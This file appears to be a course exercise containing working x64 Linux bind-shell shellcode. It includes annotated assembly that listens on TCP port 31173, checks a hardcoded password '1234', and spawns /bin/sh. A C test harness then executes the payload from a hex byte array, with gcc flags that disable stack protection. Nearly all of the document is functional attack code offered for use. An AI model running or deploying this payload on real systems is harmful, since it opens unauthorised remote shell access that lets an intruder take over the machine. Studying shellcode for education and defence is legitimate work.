/*
;Title:            bindshell with password in 92 bytes
;Author:           David Velázquez a.k.a d4sh&r
;Contact:          https://mx.linkedin.com/in/d4v1dvc
;Description:      x64 Linux bind TCP port shellcode on port 31173 with 4 bytes as password  in 94 bytes
;Tested On:        Linux kali64 3.18.0-kali3-amd64 x86_64 GNU/Linux

;Compile & Run:    nasm -f elf64 -o bindshell.o bindshell.nasm
;                  ld -o bindshell bindshell.o
;                  ./bindshell
;SLAE64-1379


global _start


_start:

socket:
    ;int socket(int domain, int type, int protocol)2,1,0
    xor esi,esi                      ;rsi=0
    mul esi                          ;rdx,rax,rsi=0, rdx is 3rd argument
    inc esi                          ;rsi=1, 2nd argument
    push 2
    pop rdi                          ;rdi=2,1st argument
    add al, 41                       ;socket syscall
    syscall

    push rax	                     ;socket result
    pop rdi                          ;rdi=sockfd

    ;struct sockaddr_in {
    ;           sa_family_t    sin_family; /* address family: AF_INET */
    ;           in_port_t      sin_port;   /* port in network byte order */
    ;           struct in_addr sin_addr;   /* internet address */
    ;};

    push 2			     ;AF_INET
    mov word [rsp + 2], 0xc579       ;port 31173
    push rsp
    pop rsi                          ;rsi=&sockaddr

bind:
    ;int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
    push rdx                         ;initialize with 0 to avoid SEGFAULT
    push 16
    pop rdx                          ;rdx=16 (sizeof sockaddr)
    push 49			     ;bind syscall
    pop rax
    syscall

listen:
    ;int listen(int sockfd, int backlog)
    pop rsi
    mov al, 50 			     ;listen syscall
    syscall

accept:
    ;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
    mov al, 43                       ;accept syscall
    syscall

    ;store client
    push rax                         ;accept result(client)
    pop rdi                          ;rdi=client

    ;don't to close parent to have a small shellcode
    ;in a loop is necessary to close the conection!!

password:
    ;ssize_t read(int fd, void *buf, size_t count)
    push rsp                         ;1st argument
    pop rsi                          ;2nd argument
    xor eax, eax                     ;read syscall
    syscall

    cmp dword [rsp], '1234'          ;"1234" like password
    jne error                        ; if wrong password then crash program

    ;int dup2(int oldfd, int newfd)
    push 3
    pop rsi

dup2:
    dec esi
    mov al, 33                       ;dup2 syscall applied to error,output and input
    syscall
    jne dup2

execve:
    ;int execve(const char *filename, char *const argv[],char *const envp[])
    push rsi
    pop rdx                          ;3rd argument
    push rsi                         ;2nd argument
    mov rbx, 0x68732f2f6e69622f      ;1st argument /bin//sh
    push rbx
    push rsp
    pop rdi
    mov al, 59			     ;execve
    syscall

error:
    ;SEGFAULT

*/

#include<stdio.h>
#include<string.h>
//gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
unsigned char code[] = \
"\x31\xf6\xf7\xe6\xff\xc6\x6a\x02\x5f\x04\x29\x0f\x05\x50\x5f\x6a\x02\x66\xc7\x44\x24\x02\x79\xc5\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x5e\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x50\x5f\x54\x5e\x31\xc0\x0f\x05\x81\x3c\x24\x31\x32\x33\x34\x75\x1f\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();

}